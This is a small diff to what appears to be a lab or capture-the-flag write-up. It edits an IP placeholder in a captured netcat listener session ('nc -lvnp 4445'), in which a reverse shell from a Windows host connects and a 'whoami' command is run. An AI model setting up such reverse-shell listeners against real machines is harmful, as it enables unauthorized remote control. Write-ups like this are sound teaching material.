@@ -147,7 +147,7 @@ File Type: HTML document, ASCII text
 
 ❯ nc -lvnp 4445
 listening on [any] 4445 ...
-connect to [my ip address] from (UNKNOWN) [10.112.179.163] 49825
+connect to [my vpn ip address] from (UNKNOWN) [10.112.179.163] 49825
 Microsoft Windows [Version 6.3.9600]
 (c) 2013 Microsoft Corporation. All rights reserved.
 whoami
